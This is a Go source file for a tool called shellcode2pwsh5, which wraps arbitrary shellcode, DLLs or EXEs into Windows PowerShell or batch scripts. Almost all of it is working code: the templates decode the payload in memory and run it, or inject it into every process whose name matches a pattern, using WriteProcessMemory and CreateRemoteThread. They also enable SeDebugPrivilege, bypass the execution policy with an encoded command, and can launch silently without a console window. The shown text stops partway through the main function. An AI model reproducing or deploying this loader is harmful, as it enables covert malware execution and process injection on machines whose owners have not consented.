// shellcode2pwsh5 - pack a binary payload into a self-contained Windows script.
//
// The generated script (.ps1 / .bat / .cmd) carries the payload as base64,
// decodes it in memory and executes it with a RW -> RX protection scheme.
// Runtime target: Windows PowerShell 5.1 (powershell.exe).
//
// Shellcode supports two execution modes:
//
//	local   (default)  the payload runs inside the PowerShell process itself:
//	                   VirtualAlloc -> copy -> VirtualProtect(RX) -> CreateThread.
//
//	remote (--process)  the payload is written into the address space of every
//	                   matching target process and started there with
//	                   CreateRemoteThread:
//	                   OpenProcess -> VirtualAllocEx -> WriteProcessMemory ->
//	                   VirtualProtectEx(RX) -> CreateRemoteThread.
//
// Native DLLs and EXEs use the embedded reflective PE loader.
//
// Layout of a generated .bat/.cmd file:
//
//	[5 cmd lines]       launch powershell.exe with a base64-encoded loader
//	exit /b             cmd stops here; everything below is PowerShell data
//	#__B2P_CORE__       core marker; the loader executes the file from here
//	$B2P_* variables    payload metadata, then the in-memory runner
//
// A generated .ps1 file is just the PowerShell core (no cmd wrapper).
//
// With --hidden a launcher starts a separate Windows PowerShell process
// without a console window and returns as soon as it starts.
//
// The templates are embedded in the binary, so it can run standalone.
package main

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"unicode/utf16"
)

// version is stamped at build time:
//
//	go build -ldflags "-X main.version=1.2.3" .
var version = "1.3.3.7"

const (
	progName  = "shellcode2pwsh5"
	marker    = "#__B2P_CORE__"
	b64Width  = 120
	largeWarn = 50 * 1024 * 1024
)

type archSpec struct {
	is64 bool
	hint string
}

var archInfo = map[string]archSpec{
	"x64": {is64: true, hint: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`},
	"x86": {is64: false, hint: `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe`},
}

// coreTpl is the PowerShell core for local execution: metadata variables,
// integrity check and the RW -> RX in-memory runner. Placeholders are
// replaced by the generator.
const localPrelude = `@MARKER@
@META@
$ErrorActionPreference = 'Stop'
if ([Environment]::Is64BitProcess -ne @ARCH64@) {
    [Console]::Error.WriteLine('B2P: architecture mismatch - payload is @ARCHNAME@, current PowerShell is ' + $(if ([Environment]::Is64BitProcess) {'64-bit'} else {'32-bit'}) + '. Use: @ARCH_HINT@')
    exit 3
}
$b64 = @'
@B64@
'@
try {
    $sc = [Convert]::FromBase64String(($b64 -replace '\s',''))
} catch {
    [Console]::Error.WriteLine('B2P: invalid base64 payload (file modified or truncated?)')
    exit 2
}
@VERIFY@
`

const coreTpl = localPrelude + `try {
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class B2P
{
    [DllImport("kernel32", SetLastError = true)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", SetLastError = true)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32", SetLastError = true)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32", SetLastError = true)] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport("kernel32", SetLastError = true)] public static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
}
'@
} catch {
    [Console]::Error.WriteLine('B2P: Add-Type failed (requires .NET Framework): ' + $_.Exception.Message)
    exit 4
}
$size = [UIntPtr]::new([uint32]$sc.Length)
$addr = [B2P]::VirtualAlloc([IntPtr]::Zero, $size, 0x3000, 0x04)
if ($addr -eq [IntPtr]::Zero) {
    [Console]::Error.WriteLine('B2P: VirtualAlloc failed (win32 error ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error() + ')')
    exit 4
}
[Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)
$old = [uint32]0
if (-not [B2P]::VirtualProtect($addr, $size, 0x20, [ref]$old)) {
    [Console]::Error.WriteLine('B2P: VirtualProtect failed (RW -> RX)')
    exit 4
}
$tid = [uint32]0
$h = [B2P]::CreateThread([IntPtr]::Zero, [UIntPtr]::Zero, $addr, [IntPtr]::Zero, 0, [ref]$tid)
if ($h -eq [IntPtr]::Zero) {
    [Console]::Error.WriteLine('B2P: CreateThread failed')
    exit 4
}
@WAIT@
`

// injectCoreTpl is the PowerShell core for remote execution: the payload is
// written into the address space of every process whose image name matches
// the target pattern and is started there with CreateRemoteThread.
//
// Target matching: the pattern is compared against the process image name
// without its extension, case-insensitively. The match is a plain substring
// test: the pattern may appear anywhere in the name. So "notep" matches
// "notepad.exe", "123" matches "123.exe", "1123.exe" and "123456.exe" but
// not "23.exe", and "xplorer" matches "explorer.exe" and "1337xplorer.exe"
// but not "plorer.exe".
const injectCoreTpl = `@MARKER@
@META@
$B2P_TARGET = '@TARGET@'
$ErrorActionPreference = 'Stop'
$b64 = @'
@B64@
'@
try {
    $sc = [Convert]::FromBase64String(($b64 -replace '\s',''))
} catch {
    [Console]::Error.WriteLine('B2P: invalid base64 payload (file modified or truncated?)')
    exit 2
}
@VERIFY@
try {
    Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;
public static class B2PI
{
    [StructLayout(LayoutKind.Sequential)]
    public struct LUID { public uint LowPart; public int HighPart; }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_PRIVILEGES { public uint PrivilegeCount; public LUID Luid; public uint Attributes; }

    [DllImport("kernel32", SetLastError = true)] public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    [DllImport("kernel32", SetLastError = true)] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", SetLastError = true)] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);
    [DllImport("kernel32", SetLastError = true)] public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32", SetLastError = true)] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
    [DllImport("kernel32", SetLastError = true)] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport("kernel32", SetLastError = true)] public static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
    [DllImport("kernel32", SetLastError = true)] public static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);
    [DllImport("kernel32", SetLastError = true)] public static extern bool CloseHandle(IntPtr hObject);
    [DllImport("kernel32", SetLastError = true)] public static extern IntPtr GetCurrentProcess();
    [DllImport("advapi32", SetLastError = true)] public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    [DllImport("advapi32", SetLastError = true)] public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
    [DllImport("advapi32", SetLastError = true)] public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
}
'@
} catch {
    [Console]::Error.WriteLine('B2P: Add-Type failed (requires .NET Framework): ' + $_.Exception.Message)
    exit 4
}
function B2PI-EnableDebugPrivilege {
    try {
        $hToken = [IntPtr]::Zero
        if (-not [B2PI]::OpenProcessToken([B2PI]::GetCurrentProcess(), 0x28, [ref]$hToken)) { return $false }
        try {
            $luid = New-Object 'B2PI+LUID'
            if (-not [B2PI]::LookupPrivilegeValue($null, 'SeDebugPrivilege', [ref]$luid)) { return $false }
            $tp = New-Object 'B2PI+TOKEN_PRIVILEGES'
            $tp.PrivilegeCount = 1
            $tp.Luid = $luid
            $tp.Attributes = 2
            [void][B2PI]::AdjustTokenPrivileges($hToken, $false, [ref]$tp, 0, [IntPtr]::Zero, [IntPtr]::Zero)
            if ([Runtime.InteropServices.Marshal]::GetLastWin32Error() -eq 1300) { return $false }
            return $true
        } finally {
            [void][B2PI]::CloseHandle($hToken)
        }
    } catch {
        return $false
    }
}
` + matchTarget + `$os64 = [Environment]::Is64BitOperatingSystem
$injector64 = [Environment]::Is64BitProcess
$payload64 = ($B2P_ARCH -eq 'x64')
[void](B2PI-EnableDebugPrivilege)
$selfPid = $PID
$targets = @()
try {
    $targets = @(Get-Process -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne $selfPid -and (B2PI-MatchTarget $B2P_TARGET $_.ProcessName) })
} catch {
    $targets = @()
}
` + injectTargetsTpl

const matchTarget = `function B2PI-MatchTarget([string]$pattern, [string]$imageName) {
    $p = $pattern
    if ($p.EndsWith('.exe', [StringComparison]::OrdinalIgnoreCase)) { $p = $p.Substring(0, $p.Length - 4) }
    $n = $imageName
    if ($n.EndsWith('.exe', [StringComparison]::OrdinalIgnoreCase)) { $n = $n.Substring(0, $n.Length - 4) }
    if ([string]::IsNullOrEmpty($p) -or [string]::IsNullOrEmpty($n)) { return $false }
    return ($n.IndexOf($p, [StringComparison]::OrdinalIgnoreCase) -ge 0)
}
`

const injectTargetsTpl = `if ($targets.Count -eq 0) {
    [Console]::Error.WriteLine('B2P: no process matching "' + $B2P_TARGET + '" was found')
    exit 5
}
$injected = 0
$failed = 0
$failCode = 0
$errCode = 0
$lastExit = 0
$threads = @()
foreach ($proc in $targets) {
    $hProc = [B2PI]::OpenProcess(0x43A, $false, [int]$proc.Id)
    if ($hProc -eq [IntPtr]::Zero) {
        [Console]::Error.WriteLine('B2P: OpenProcess failed for ' + $proc.ProcessName + ' (pid ' + $proc.Id + '), win32 error ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error())
        if ($failCode -eq 0) { $failCode = 6 }
        $failed++
        continue
    }
    try {
        $wow64 = $false
        [void][B2PI]::IsWow64Process($hProc, [ref]$wow64)
        $target64 = ($os64 -and (-not $wow64))
        if ($payload64 -ne $target64) {
            [Console]::Error.WriteLine('B2P: architecture mismatch - payload is ' + $B2P_ARCH + ', target ' + $proc.ProcessName + ' is ' + $(if ($target64) {'64-bit'} else {'32-bit'}))
            if ($failCode -eq 0) { $failCode = 3 }
            $failed++
            continue
        }
        if ($target64 -and (-not $injector64)) {
            [Console]::Error.WriteLine('B2P: a 32-bit PowerShell cannot inject into the 64-bit process ' + $proc.ProcessName)
            if ($failCode -eq 0) { $failCode = 3 }
            $failed++
            continue
        }
        $size = [UIntPtr]::new([uint32]$sc.Length)
        $addr = [B2PI]::VirtualAllocEx($hProc, [IntPtr]::Zero, $size, 0x3000, 0x04)
        if ($addr -eq [IntPtr]::Zero) {
            [Console]::Error.WriteLine('B2P: VirtualAllocEx failed for ' + $proc.ProcessName + ', win32 error ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error())
            if ($failCode -eq 0) { $failCode = 4 }
            $failed++
            continue
        }
        $written = [UIntPtr]::Zero
        if (-not [B2PI]::WriteProcessMemory($hProc, $addr, $sc, $size, [ref]$written)) {
            [Console]::Error.WriteLine('B2P: WriteProcessMemory failed for ' + $proc.ProcessName + ', win32 error ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error())
            if ($failCode -eq 0) { $failCode = 4 }
            $failed++
            continue
        }
        $old = [uint32]0
        if (-not [B2PI]::VirtualProtectEx($hProc, $addr, $size, 0x20, [ref]$old)) {
            [Console]::Error.WriteLine('B2P: VirtualProtectEx failed for ' + $proc.ProcessName + ', win32 error ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error())
            if ($failCode -eq 0) { $failCode = 4 }
            $failed++
            continue
        }
        $rtid = [uint32]0
        $hThread = [B2PI]::CreateRemoteThread($hProc, [IntPtr]::Zero, [UIntPtr]::Zero, $addr, [IntPtr]::Zero, 0, [ref]$rtid)
        if ($hThread -eq [IntPtr]::Zero) {
            [Console]::Error.WriteLine('B2P: CreateRemoteThread failed for ' + $proc.ProcessName + ', win32 error ' + [Runtime.InteropServices.Marshal]::GetLastWin32Error())
            if ($failCode -eq 0) { $failCode = 4 }
            $failed++
            continue
        }
        $injected++
        [Console]::WriteLine('B2P: injected ' + $sc.Length + ' bytes into ' + $proc.ProcessName + ' (pid ' + $proc.Id + '), remote thread ' + $rtid)
        $threads += [pscustomobject]@{ Handle = $hThread; Proc = $proc }
    } finally {
        [void][B2PI]::CloseHandle($hProc)
    }
}
if ($injected -eq 0) {
    if ($failCode -eq 0) { $failCode = 4 }
    exit $failCode
}
if ($failed -gt 0) {
    [Console]::Error.WriteLine('B2P: warning: ' + $failed + ' of ' + $targets.Count + ' matching processes could not be injected (see above), continuing with ' + $injected)
}
@WAIT_ALL@
if ($errCode -ne 0) { exit $errCode }
exit $lastExit
`

// headTpl is the cmd wrapper for .bat/.cmd outputs. It hands control to
// powershell.exe and stops before the PowerShell part of the file.
const headTpl = `@echo off
setlocal
set "B2P_SELF=%~f0"
set "B2P_PS=%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe"
@X86FALLBACK@
"%B2P_PS%" -NoProfile -ExecutionPolicy Bypass -EncodedCommand @ENC@
exit /b %ERRORLEVEL%
`

func die(msg string, code int) {
	fmt.Fprintf(os.Stderr, "%s: error: %s\n", progName, msg)
	os.Exit(code)
}

func usage() {
	out := flag.CommandLine.Output()
	fmt.Fprintf(out, "%s %s - pack a binary payload into a self-contained Windows script (.ps1/.bat/.cmd)\n", progName, version)
	fmt.Fprint(out, `
Usage:
  shellcode2pwsh5 -i <payload> -f <ps1|bat|cmd> [options]

Options:
  -i, --input  <path>   input binary file (required)
  -f, --format <fmt>    output format: ps1 | bat | cmd (required)
  -o, --output <path>   output file or directory (default: .\input.<fmt>)
  -t, --type   <type>   shellcode | dll | exe (default: detect from file contents)
      --exe-arg=<arg>   append one EXE argument (repeatable, in order)
  -a, --arch   <arch>   x64 | x86 (PE: auto-detected, shellcode: default x64)
  -p, --process <name>  inject shellcode or DLL into matching processes
      --timeout <ms>    shellcode thread wait limit (0 = wait forever)
      --detach          skip the shellcode thread wait
      --verify          run a SHA-256 integrity self-check before execution
      --hidden          start PowerShell in the background without a console window
      --force           overwrite an existing output file
      --version         print version and exit
  -h, --help            show this help

Target matching (--process):
  The pattern is compared against the process image name without its
  extension, case-insensitively. The match is a plain substring test: the
  pattern may appear anywhere in the name.
    -p 1337       matches 1337.exe, 69133769.exe, 1337.1337.exe but not 13.37.exe
    -p xplorer   matches explorer.exe and 3xplorer.exe but not plorer.exe
    -p explorer  matches windows_explorer.exe but not xplorer.exe
  Only one --process pattern may be given. Without --process the payload runs
  inside the PowerShell process that executes the script. EXE rejects --process.

PE notes:
  Without --type, a PE header selects DLL or EXE. Other inputs use shellcode.
  DLL mode calls the case-sensitive void VoidFunc() export. Remote DLL mode
  returns after launching the export. Local PE loading is synchronous.

Remote injection notes:
  The payload must match the bitness of the target process; a 32-bit payload
  cannot run in a 64-bit process and vice versa. A 32-bit PowerShell cannot
  inject into a 64-bit process at all. DLL mode requires PowerShell and the
  target process to match the DLL's bitness. The shellcode runner enables
  SeDebugPrivilege when possible.

Notes on --hidden:
  The launcher returns after creating the background process. Its exit code
  reports launch success or failure. Payload output and exit codes are not
  sent back to the calling terminal.

Generated script exit codes: shellcode exit code passes through when its
thread was allowed to finish; container errors: 2 = payload data or
marker damaged, 3 = architecture mismatch, 4 = memory API failure,
5 = no matching target process, 6 = target process could not be opened,
7 = timed out waiting for the payload thread.
With several matching processes, a target that cannot be opened or written
to is reported as a warning and leaves the exit code alone as long as at
least one target was injected; codes 3, 4 and 6 describe a run in which
nothing could be injected.
`)
}

// buildLoader returns the short PowerShell loader that is passed to
// powershell.exe via -EncodedCommand by the cmd wrapper. It reads the script
// file itself, locates the core marker and executes everything from there.
func buildLoader() string {
	return "if(-not $env:B2P_SELF){[Console]::Error.WriteLine('B2P: B2P_SELF is not set');exit 2};" +
		"try{$t=[IO.File]::ReadAllText($env:B2P_SELF)}catch{[Console]::Error.WriteLine('B2P: cannot read script file');exit 2};" +
		"$i=$t.IndexOf('" + marker + "');" +
		"if($i -lt 0){[Console]::Error.WriteLine('B2P: core marker not found (file modified or truncated)');exit 2};" +
		"iex $t.Substring($i)"
}

// encodeCommand encodes a PowerShell command for -EncodedCommand.
func encodeCommand(command string) string {
	units := utf16.Encode([]rune(command))
	buf := make([]byte, 0, len(units)*2)
	for _, u := range units {
		buf = append(buf, byte(u), byte(u>>8))
	}
	return base64.StdEncoding.EncodeToString(buf)
}

// The child reads the core from disk. Only the loader is passed on the command
// line, and the path is passed through the child's environment.
func buildBackgroundLauncher(arch, scriptPath string) string {
	systemDir := `if ([Environment]::Is64BitOperatingSystem) { $systemDir = 'SysWOW64' }`
	if archInfo[arch].is64 {
		systemDir = `if ([Environment]::Is64BitOperatingSystem -and -not [Environment]::Is64BitProcess) { $systemDir = 'Sysnative' }`
	}
	return fmt.Sprintf(`try {
    $scriptPath = %s
    if (-not $scriptPath) { throw 'Script path is unavailable' }
    $systemDir = 'System32'
    %s
    $start = New-Object System.Diagnostics.ProcessStartInfo
    $start.FileName = [IO.Path]::Combine($env:SystemRoot, $systemDir, 'WindowsPowerShell\v1.0\powershell.exe')
    $start.Arguments = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -EncodedCommand %s'
    $start.UseShellExecute = $false
    $start.CreateNoWindow = $true
    $start.EnvironmentVariables['B2P_SELF'] = $scriptPath
    $child = [Diagnostics.Process]::Start($start)
    $child.Dispose()
} catch {
    [Console]::Error.WriteLine('B2P: could not start background PowerShell: ' + $_.Exception.Message)
    exit 4
}
exit 0
`, scriptPath, systemDir, encodeCommand(buildLoader()))
}

func wrapB64(data []byte) string {
	b64 := base64.StdEncoding.EncodeToString(data)
	var sb strings.Builder
	for i := 0; i < len(b64); i += b64Width {
		end := i + b64Width
		if end > len(b64) {
			end = len(b64)
		}
		sb.WriteString(b64[i:end])
		sb.WriteByte('\n')
	}
	return strings.TrimRight(sb.String(), "\n")
}

// waitBlockLocal builds the code that waits for the local payload thread and
// turns its exit code into the script exit code.
//
//	handleVar  name of the thread handle variable
//	timeoutMs  0 means wait forever
//	detach     when true the thread is not waited for at all
func waitBlockLocal(handleVar string, timeoutMs int, detach bool) string {
	if detach {
		return "exit 0\n"
	}
	wait := "[uint32]::MaxValue"
	if timeoutMs > 0 {
		wait = "[uint32]" + strconv.Itoa(timeoutMs)
	}
	return "$wr = [B2P]::WaitForSingleObject(" + handleVar + ", " + wait + ")\n" +
		"if ($wr -eq 258) {\n" +
		"    [Console]::Error.WriteLine('B2P: timed out waiting for the payload thread')\n" +
		"    exit 7\n" +
		"}\n" +
		"$ec = [uint32]0\n" +
		"[void][B2P]::GetExitCodeThread(" + handleVar + ", [ref]$ec)\n" +
		"exit ([int]$ec)\n"
}

// waitBlockRemote builds the code that waits for every remote payload thread
// that was started. All targets are injected first, so a long running payload
// in one target never keeps the remaining targets from being injected.
//
// The exit code of the first target that finishes is reported as the script
// exit code; a timeout is recorded in $errCode so that the remaining threads
// are still waited for.
//
//	timeoutMs  0 means wait forever
//	detach     when true the threads are not waited for at all
func waitBlockRemote(timeoutMs int, detach bool) string {
	if detach {
		return "foreach ($t in $threads) { [void][B2PI]::CloseHandle($t.Handle) }\n"
	}
	wait := "[uint32]::MaxValue"
	if timeoutMs > 0 {
		wait = "[uint32]" + strconv.Itoa(timeoutMs)
	}
	return "foreach ($t in $threads) {\n" +
		"    $wr = [B2PI]::WaitForSingleObject($t.Handle, " + wait + ")\n" +
		"    if ($wr -eq 258) {\n" +
		"        [Console]::Error.WriteLine('B2P: timed out waiting for the payload thread in ' + $t.Proc.ProcessName)\n" +
		"        if ($errCode -eq 0) { $errCode = 7 }\n" +
		"    } elseif ($errCode -eq 0) {\n" +
		"        $ec = [uint32]0\n" +
		"        [void][B2PI]::GetExitCodeThread($t.Handle, [ref]$ec)\n" +
		"        $lastExit = [int]$ec\n" +
		"    }\n" +
		"    [void][B2PI]::CloseHandle($t.Handle)\n" +
		"}\n"
}

// buildCore returns the PowerShell core for local execution.
func buildCore(payloadType, arch string, payload []byte, sha string, verify bool, timeoutMs int, detach bool) (string, error) {
	info := archInfo[arch]
	meta := fmt.Sprintf("$B2P_TYPE='%s';$B2P_ARCH='%s';$B2P_SIZE=%d\n$B2P_SHA256='%s'",
		payloadType, arch, len(payload), sha)

	text := coreTpl
	if verify {
		text = strings.Replace(text, "@VERIFY@\n", verifyPayload+"\n", 1)
	} else {
		text = strings.Replace(text, "@VERIFY@\n", "", 1)
	}

	arch64 := "$false"
	if info.is64 {
		arch64 = "$true"
	}
	replacements := [][2]string{
		{"@MARKER@", marker},
		{"@META@", meta},
		{"@ARCH64@", arch64},
		{"@ARCHNAME@", arch},
		{"@ARCH_HINT@", info.hint},
		{"@B64@", wrapB64(payload)},
		{"@WAIT@", waitBlockLocal("$h", timeoutMs, detach)},
	}
	for _, kv := range replacements {
		text = strings.ReplaceAll(text, kv[0], kv[1])
	}
	for _, kv := range replacements {
		if strings.Contains(text, kv[0]) {
			return "", fmt.Errorf("internal error: template placeholder %s was not replaced", kv[0])
		}
	}
	return text, nil
}

const verifyPayload = `if ($sc.Length -ne $B2P_SIZE) { [Console]::Error.WriteLine('B2P: integrity check failed (size mismatch)'); exit 2 }
$hs = [BitConverter]::ToString([System.Security.Cryptography.SHA256]::Create().ComputeHash($sc)).Replace('-','').ToLowerInvariant()
if ($hs -ne $B2P_SHA256) { [Console]::Error.WriteLine('B2P: integrity check failed (sha256 mismatch - file modified?)'); exit 2 }`

// buildInjectCore returns the PowerShell core for remote execution.
func buildInjectCore(payloadType, arch string, payload []byte, sha string, verify bool, target string, timeoutMs int, detach bool) (string, error) {
	meta := fmt.Sprintf("$B2P_TYPE='%s';$B2P_ARCH='%s';$B2P_SIZE=%d\n$B2P_SHA256='%s'",
		payloadType, arch, len(payload), sha)

	text := injectCoreTpl
	if verify {
		text = strings.Replace(text, "@VERIFY@\n", verifyPayload+"\n", 1)
	} else {
		text = strings.Replace(text, "@VERIFY@\n", "", 1)
	}

	replacements := [][2]string{
		{"@MARKER@", marker},
		{"@META@", meta},
		{"@TARGET@", target},
		{"@B64@", wrapB64(payload)},
		{"@WAIT_ALL@", waitBlockRemote(timeoutMs, detach)},
	}
	for _, kv := range replacements {
		text = strings.ReplaceAll(text, kv[0], kv[1])
	}
	for _, kv := range replacements {
		if strings.Contains(text, kv[0]) {
			return "", fmt.Errorf("internal error: template placeholder %s was not replaced", kv[0])
		}
	}
	return text, nil
}

func buildHead(arch, enc string) (string, error) {
	fallback := ""
	if !archInfo[arch].is64 {
		fallback = `if exist "%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" set "B2P_PS=%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"`
	}
	text := strings.ReplaceAll(headTpl, "@X86FALLBACK@", fallback)
	text = strings.ReplaceAll(text, "@ENC@", enc)
	if strings.Contains(text, "@X86FALLBACK@") || strings.Contains(text, "@ENC@") {
		return "", fmt.Errorf("internal error: head template placeholders were not replaced")
	}
	return text, nil
}

// writeScript writes the output as pure ASCII, CRLF line endings, no BOM,
// using a temp file + rename so the target is never half-written.
func writeScript(path, text string) error {
	for i := 0; i < len(text); i++ {
		if text[i] > 0x7F {
			return fmt.Errorf("output contains a non-ASCII byte at offset %d; templates must stay pure ASCII", i)
		}
	}
	text = strings.ReplaceAll(text, "\r\n", "\n")
	data := []byte(strings.ReplaceAll(text, "\n", "\r\n"))
	tmp := path + ".tmp"
	if err := os.WriteFile(tmp, data, 0o644); err != nil {
		return err
	}
	return os.Rename(tmp, path)
}

func resolveOutput(inputPath, format, output string) string {
	base := strings.TrimSuffix(filepath.Base(inputPath), filepath.Ext(inputPath))
	defaultName := base + "." + format
	if output == "" {
		return defaultName
	}
	if strings.HasSuffix(output, "/") || strings.HasSuffix(output, "\\") {
		return filepath.Join(output, defaultName)
	}
	if st, err := os.Stat(output); err == nil && st.IsDir() {
		return filepath.Join(output, defaultName)
	}
	got := strings.ToLower(filepath.Ext(output))
	expected := "." + format
	sameFamily := (format == "bat" || format == "cmd") && (got == ".bat" || got == ".cmd")
	if got != expected && !sameFamily {
		shown := got
		if shown == "" {
			shown = "(none)"
		}
		fmt.Fprintf(os.Stderr, "%s: warning: -o extension %s does not match format %s (writing anyway)\n",
			progName, shown, format)
	}
	return output
}

// escapePSLiteral escapes a string so it can be embedded in a single-quoted
// PowerShell string literal.
func escapePSLiteral(s string) string {
	return strings.ReplaceAll(s, "'", "''")
}

// validateTarget checks that the target pattern can be embedded safely in the
// generated script.
func validateTarget(pattern string) error {
	for i := 0; i < len(pattern); i++ {
		c := pattern[i]
		if c > 0x7F {
			return fmt.Errorf("target pattern must be ASCII (non-ASCII byte at offset %d)", i)
		}
		if c < 0x20 || c == 0x7F {
			return fmt.Errorf("target pattern must not contain control characters (byte 0x%02x at offset %d)", c, i)
		}
	}
	return nil
}

// singleFlag is a string flag that refuses to be given more than once. The
// standard flag package silently lets the last occurrence win, which would
// hide a mistake such as "-p notepad -p explorer".
type singleFlag struct {
	value string
	seen  bool
}

func (s *singleFlag) String() string { return s.value }

func (s *singleFlag) Set(v string) error {
	if s.seen {
		return fmt.Errorf("option may only be given once")
	}
	s.seen = true
	s.value = v
	return nil
}

// timeoutText renders the timeout for the summary output.
func timeoutText(ms int) string {
	if ms <= 0 {
		return "infinite"
	}
	return fmt.Sprintf("%dms", ms)
}

func main() {
	flag.Usage = usage

	var (
		format      string
		output      string
		payloadType string
		arch        string
		timeoutMs   int
		detach      bool
		verify      bool
		hidden      bool
		force       bool
		showVersion bool
	)
	inputFlag, targetFlag := &singleFlag{}, &singleFlag{}
	var exeArgs []string
	flag.Func("exe-arg", "append one EXE argument (repeatable)", func(arg string) error {
		if strings.IndexByte(arg, 0) >= 0 {
			return fmt.Errorf("EXE arguments cannot contain NUL bytes")
		}
		exeArgs = append(exeArgs, arg)
		return nil
	})
	flag.Var(inputFlag, "i", "input binary file")
	flag.Var(inputFlag, "input", "input binary file")
	flag.StringVar(&format, "f", "", "output format: ps1 | bat | cmd")
	flag.StringVar(&format, "format", "", "output format: ps1 | bat | cmd")
	flag.StringVar(&output, "o", "", "output file or directory")
	flag.StringVar(&output, "output", "", "output file or directory")
	flag.StringVar(&payloadType, "t", "", "payload type (default: auto-detect)")
	flag.StringVar(&payloadType, "type", "", "payload type (default: auto-detect)")
	flag.StringVar(&arch, "a", "x64", "target architecture: x64 | x86")
	flag.StringVar(&arch, "arch", "x64", "target architecture: x64 | x86")
	flag.Var(targetFlag, "p", "target process name pattern (injects into matching processes)")
	flag.Var(targetFlag, "process", "target process name pattern (injects into matching processes)")
	flag.IntVar(&timeoutMs, "timeout", 0, "max wait in milliseconds for the payload thread (0 = wait forever)")
	flag.BoolVar(&detach, "detach", false, "do not wait for the payload thread")
	flag.BoolVar(&verify, "verify", false, "run a SHA-256 integrity self-check before execution")
	flag.BoolVar(&hidden, "hidden", false, "start PowerShell in the background without a console window")
	flag.BoolVar(&force, "force", false, "overwrite an existing output file")
	flag.BoolVar(&showVersion, "version", false, "print version and exit")
	flag.Parse()

	if showVersion {
		fmt.Printf("%s %s\n", progName, version)
		return
	}

	if flag.NArg() != 0 {
		die("unexpected positional arguments (see -h for usage)", 1)
	}
	input := inputFlag.value
	if input == "" {
		die("missing required option -i/--input (see -h for usage)", 1)
	}
	if format == "" {
		die("missing required option -f/--format, expected ps1 | bat | cmd (see -h for usage)", 1)
	}
	format = strings.ToLower(format)
	payloadType = strings.ToLower(payloadType)
	arch = strings.ToLower(arch)
	target := strings.TrimSpace(targetFlag.value)
	archSet, waitSet, typeSet := false, false, false
	flag.Visit(func(f *flag.Flag) {
		switch f.Name {
		case "a", "arch":
			archSet = true
		case "timeout", "detach":
			waitSet = true
		case "t", "type":
			typeSet = true
		}
	})

	switch format {
	case "ps1", "bat", "cmd":
	default:
		die(fmt.Sprintf("unknown format %q, expected ps1, bat or cmd", format), 1)
	}
	if typeSet && payloadType != "shellcode" && payloadType != "dll" && payloadType != "exe" {
		die(fmt.Sprintf("unknown payload type %q, expected shellcode, dll or exe", payloadType), 1)
	}
	if _, ok := archInfo[arch]; !ok {
		die(fmt.Sprintf("unknown architecture %q, expected x64 or x86", arch), 1)
	}
	if timeoutMs < 0 {
		die(fmt.Sprintf("invalid timeout %d, expected a non-negative number of milliseconds", timeoutMs), 1)
	}
	if target != "" {
		if err := validateTarget(target); err != nil {
			die(err.Error(), 1)
		}
	}

	st, err := os.Stat(input)
	if err != nil || st.IsDir() {
		die("input file not found: "+input, 1)
	}
	payload, err := os.ReadFile(input)
	if err != nil {
		die("cannot read input file: "+err.Error(), 1)
	}
	if len(payload) == 0 {
		die("input file is empty: "+input, 1)
	}
	isPE := hasPESignature(payload)
	if !typeSet && !isPE {
		payloadType = "shellcode"
	}
	if payloadType != "shellcode" {
		if !isPE {
			die("expected a Windows PE image", 1)
		}
		peType, peArch, err := inspectPE(payload)
		if err != nil {
			die(err.Error(), 1)
		}
		if typeSet && payloadType != peType {
			die(fmt.Sprintf("PE image does not match --type %s (detected %s)", payloadType, peType), 1)
		}
		payloadType = peType
		if archSet && arch != peArch {
			die(fmt.Sprintf("--arch %s does not match PE architecture %s", arch, peArch), 1)
		}
		arch = peArch
	}
	if payloadType == "exe" && targetFlag.seen {
		die("--process is only supported for shellcode and DLL payloads", 1)
	}
